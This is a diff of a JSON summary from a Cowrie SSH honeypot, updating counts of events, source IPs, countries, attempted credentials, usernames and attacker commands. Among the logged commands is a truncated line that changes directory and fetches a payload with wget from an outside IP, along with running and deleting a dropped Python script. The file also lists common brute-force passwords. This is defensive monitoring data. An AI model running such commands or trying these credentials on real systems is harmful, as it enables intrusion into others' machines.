@@ -1,29 +1,29 @@
 {
  "generated_from": "LogKompass Cowrie sensor",
  "totals": {
-  "events": 215447,
-  "distinct_ips": 1224
+  "events": 220438,
+  "distinct_ips": 1235
  },
  "by_kind": [
   {
    "kind": "cowrie_command",
-   "n": 55669
+   "n": 56928
   },
   {
    "kind": "cowrie_session",
-   "n": 54035
+   "n": 55285
   },
   {
    "kind": "cowrie_connect",
-   "n": 54033
+   "n": 55283
   },
   {
    "kind": "cowrie_login_success",
-   "n": 51421
+   "n": 52647
   },
   {
    "kind": "cowrie_login_failed",
-   "n": 289
+   "n": 295
   }
  ],
  "top_ips": [
@@ -82,6 +82,12 @@
    "as_org": "TechTies Inc."
   },
   {
+   "ip": "77.239.124.146",
+   "n": 4424,
+   "country": "US",
+   "as_org": "Banatsync Srl"
+  },
+  {
    "ip": "109.160.32.146",
    "n": 4392,
    "country": "BG",
@@ -89,12 +95,6 @@
   },
   {
    "ip": "109.160.32.147",
-   "n": 4392,
-   "country": "BG",
-   "as_org": "TechTies Inc."
-  },
-  {
-   "ip": "109.160.32.176",
    "n": 4392,
    "country": "BG",
    "as_org": "TechTies Inc."
@@ -107,11 +107,11 @@
   },
   {
    "country": "US",
-   "n": 34831
+   "n": 39269
   },
   {
    "country": "RO",
-   "n": 9905
+   "n": 10045
   },
   {
    "country": "PH",
@@ -127,7 +127,7 @@
   },
   {
    "country": "NL",
-   "n": 960
+   "n": 962
   },
   {
    "country": "BD",
@@ -135,17 +135,17 @@
   },
   {
    "country": "TR",
-   "n": 760
+   "n": 772
   },
   {
-   "country": "SE",
-   "n": 473
+   "country": "DE",
+   "n": 616
   }
  ],
  "top_credentials": [
   {
    "cred": "support/support",
-   "n": 264
+   "n": 270
   },
   {
    "cred": "0/0",
@@ -153,85 +153,85 @@
   },
   {
    "cred": "root/123456",
-   "n": 106
+   "n": 110
   },
   {
    "cred": "root/1234",
-   "n": 96
+   "n": 99
   },
   {
    "cred": "root/12345",
-   "n": 94
+   "n": 98
   },
   {
    "cred": "root/111111",
-   "n": 92
+   "n": 93
   },
   {
    "cred": "root/12345678",
-   "n": 88
-  },
-  {
-   "cred": "root/123123",
-   "n": 85
+   "n": 91
   },
   {
    "cred": "root/123456789",
-   "n": 84
+   "n": 86
+  },
+  {
+   "cred": "root/123123",
+   "n": 86
   },
   {
    "cred": "admin/admin",
-   "n": 84
+   "n": 86
   },
   {
    "cred": "root/123",
-   "n": 76
+   "n": 79
   },
   {
    "cred": "admin/1234",
-   "n": 70
+   "n": 71
   },
   {
    "cred": "root/LeitboGi0ro",
-   "n": 65
+   "n": 66
   },
   {
    "cred": "root/admin",
-   "n": 61
+   "n": 63
   },
   {
    "cred": "root/123321",
-   "n": 54
+   "n": 55
   }
  ],
  "top_usernames": [
   {
    "username": "root",
-   "n": 10539
+   "n": 11034
   },
   {
    "username": "admin",
-   "n": 1169
+   "n": 1210
   },
   {
    "username": "ubuntu",
-   "n": 681
+   "n": 719
   },
   {
    "username": "user",
-   "n": 471
+   "n": 499
   },
   {
    "username": "deploy",
-   "n": 380
+   "n": 403
   },
   {
    "username": "support",
-   "n": 328
+   "n": 337
   },
   {
    "username": "test",
-   "n": 291
+   "n": 308
   },
   {
    "username": "0",
@@ -239,41 +239,41 @@
   },
   {
    "username": "user1",
-   "n": 209
+   "n": 221
   },
   {
    "username": "claude",
-   "n": 176
+   "n": 186
   },
   {
    "username": "postgres",
-   "n": 159
+   "n": 168
   },
   {
    "username": "debian",
-   "n": 146
+   "n": 154
   }
  ],
  "top_commands": [
   {
    "cmd": "uname -s -v -n -r -m",
-   "n": 45175
+   "n": 46279
   },
   {
    "cmd": "printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter ",
-   "n": 2710
+   "n": 2734
   },
   {
    "cmd": "#!/bin/bash\necho \"xxxxxx\"\n",
-   "n": 2710
+   "n": 2734
   },
   {
    "cmd": "echo xsec",
-   "n": 2576
+   "n": 2650
   },
   {
    "cmd": "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nu",
-   "n": 1355
+   "n": 1367
   },
   {
    "cmd": "/bin/./uname -s -v -n -r -m",
@@ -285,11 +285,15 @@
   },
   {
    "cmd": "uname -a",
-   "n": 64
+   "n": 65
+  },
+  {
+   "cmd": "echo SHELL_TEST",
+   "n": 36
   },
   {
    "cmd": "",
-   "n": 26
+   "n": 27
   },
   {
    "cmd": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.114.1",
@@ -297,10 +301,6 @@
   },
   {
    "cmd": "rm /tmp/bendi.py",
-   "n": 23
-  },
-  {
-   "cmd": "python3 /tmp/bendi.py",
    "n": 23
   }
  ],
@@ -1543,7 +1543,23 @@
   },
   {
    "hour": "2026-10-10T16",
-   "n": 7
+   "n": 70
+  },
+  {
+   "hour": "2026-10-10T17",
+   "n": 807
+  },
+  {
+   "hour": "2026-10-10T18",
+   "n": 3114
+  },
+  {
+   "hour": "2026-10-10T19",
+   "n": 838
+  },
+  {
+   "hour": "2026-10-10T20",
+   "n": 169
   }
  ],
  "latest_digest": {
